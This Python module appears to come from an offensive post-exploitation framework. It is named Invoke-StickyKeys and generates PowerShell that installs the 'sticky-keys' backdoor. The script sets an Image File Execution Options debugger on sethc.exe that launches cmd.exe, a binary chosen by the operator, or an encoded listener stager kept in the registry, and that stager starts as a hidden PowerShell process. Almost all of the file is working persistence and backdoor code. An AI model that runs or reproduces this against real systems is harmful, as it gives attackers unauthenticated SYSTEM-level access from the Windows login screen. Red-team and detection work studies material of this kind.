from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-StickyKeys',

            'Author': ['@harmj0y'],

            'Description': ("Sets the debugger for sethc.exe to be cmd.exe (aka the 'sticky-keys' "
                            "backdoor), another binary of your choice, or a listener stager. This can be launched from "
                            "the ease-of-access center or by pressing shift 5 times."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [ ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   False,
                'Value'         :   'HKLM:Software\Microsoft\Network\debug'
            },
            'Cleanup' : {
                'Description'   :   'Switch. Disable the sethc.exe debugger.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Binary' : {
                'Description'   :   'Binary to set for the debugger.',
                'Required'      :   False,
                'Value'         :   'C:\Windows\System32\cmd.exe'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # management options
        cleanup = self.options['Cleanup']['Value']        
        binary = self.options['Binary']['Value']
        listenerName = self.options['Listener']['Value']

        # storage options
        regPath = self.options['RegPath']['Value']

        statusMsg = ""
        locationString = ""


        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for sethc.exe
            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';'sethc.exe debugger removed.'"
            return script
        

        if listenerName != '':
            # if there's a listener specified, generate a stager and store it

            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:
                # generate the PowerShell one-liner
                launcher = self.mainMenu.stagers.generate_launcher(listenerName)
                
                encScript = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(regPath.split("\\")[0:-1])
            name = regPath.split("\\")[-1]

            statusMsg += " stored in " + regPath + "."

            script = "$RegPath = '"+regPath+"';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+encScript+";"

            # note where the script is stored
            locationString = "$((gp "+path+" "+name+")."+name+")"

            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'sethc.exe debugger set to trigger stager for listener "+listenerName+"'"

        else:
            # the registry command to set the debugger for sethc.exe to be the binary path specified
            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name Debugger -Value '"+binary+"';'sethc.exe debugger set to "+binary+"'"

        return script
